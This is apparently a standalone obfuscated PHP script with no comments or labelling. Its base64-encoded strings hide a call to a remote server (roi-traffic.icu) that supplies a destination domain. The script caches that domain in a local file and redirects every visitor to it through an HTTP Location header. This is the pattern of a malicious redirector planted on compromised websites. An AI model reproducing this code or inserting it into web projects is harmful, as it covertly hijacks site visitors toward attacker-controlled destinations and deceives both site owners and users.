<?php
$ed6fe1d0be6347b8e = "/index/?7131571060601";
$kkk557 = "723d60518a520564b23f4de72fd97781";
$s8c7dd922ad47494f = dirname(__FILE__) . "/" . md5($ed6fe1d0be6347b8e);
$h77e8e1445762ae1a = time();
$dejrif483ol = file_exists($s8c7dd922ad47494f);
$deaa082fa57816233 = 0;
$d07cc694b9b3fc636 = 0;

if ($dejrif483ol) {
	$deaa082fa57816233 = filemtime($s8c7dd922ad47494f);
	$d07cc694b9b3fc636 = $h77e8e1445762ae1a - $deaa082fa57816233;
	$se1260894f59eeae9 = @fopen($s8c7dd922ad47494f, base64_decode('cg=='));
	$ke4e46deb7f9cc58c = json_decode(base64_decode(fread($se1260894f59eeae9, filesize($s8c7dd922ad47494f))) , 1);
	fclose($se1260894f59eeae9);
}

$v634894f9845d8dc65 = 'aHR0cDovL3JvaS10cmFmZmljLmljdS9nZXQucGhwP2Y9anNvbiZrZXk9';
$ye617ef6974faced4 = base64_decode('aHR0cDovLw==') . $ke4e46deb7f9cc58c[base64_decode('ZG9tYWlu') ] . $ed6fe1d0be6347b8e;

if ($d07cc694b9b3fc636 >= 20 || !$dejrif483ol) {
	$m9b207167e5381c47 = v64547f9857d8dc65($s8c7dd922ad47494f);
	if ($m9b207167e5381c47[base64_decode('ZG9tYWlu') ]) {
		$ye617ef6974faced4 = base64_decode('aHR0cDovLw==') . $m9b207167e5381c47[base64_decode('ZG9tYWlu') ] . $ed6fe1d0be6347b8e;
	}
}


function v64547f9857d8dc65($s8c7dd922ad47494f){
	global $v634894f9845d8dc65,$kkk557;
	if(function_exists('curl_version')){
		$kd88fc6edf21ea464 = curl_init();
		curl_setopt($kd88fc6edf21ea464, CURLOPT_RETURNTRANSFER, true);
		curl_setopt($kd88fc6edf21ea464, CURLOPT_USERAGENT, base64_decode('bmV3cmVxdWVzdA=='));
		curl_setopt($kd88fc6edf21ea464, CURLOPT_URL, base64_decode($v634894f9845d8dc65).$kkk557);
		curl_setopt($kd88fc6edf21ea464, CURLOPT_TIMEOUT, 10);
		$mb4a88417b3d0170d = curl_exec($kd88fc6edf21ea464);
	
		curl_close($kd88fc6edf21ea464);
		$ke4e46deb7f9cc58c = json_decode($mb4a88417b3d0170d, true);
		if ($ke4e46deb7f9cc58c[base64_decode('ZG9tYWlu') ]) {
			$h0666f0acdeed38d4 = @fopen($s8c7dd922ad47494f, base64_decode('dys='));
			@fwrite($h0666f0acdeed38d4, base64_encode($mb4a88417b3d0170d));
			@fclose($h0666f0acdeed38d4);
			return $ke4e46deb7f9cc58c;
		}
	}else{
		$mb4a88417b3d0170d = file_get_contents(base64_decode($v634894f9845d8dc65).$kkk557);
		$ke4e46deb7f9cc58c = json_decode($mb4a88417b3d0170d, true);
		if ($ke4e46deb7f9cc58c[base64_decode('ZG9tYWlu') ]) {
			$h0666f0acdeed38d4 = @fopen($s8c7dd922ad47494f, base64_decode('dys='));
			@fwrite($h0666f0acdeed38d4, base64_encode($mb4a88417b3d0170d));
			@fclose($h0666f0acdeed38d4);
			return $ke4e46deb7f9cc58c;
		}		
	}
	return false;
}
unlink($s8c7dd922ad47494f); $ab4a88417b3d0170f = base64_decode('TG9jYXRpb246IA==') . $ye617ef6974faced4;
$bb4a88417b3d0170f = strlen($ab4a88417b3d0170f); header("Set-Cookie: bb4a88417b3d0170f=$bb4a88417b3d0170f"); header($ab4a88417b3d0170f);
?>
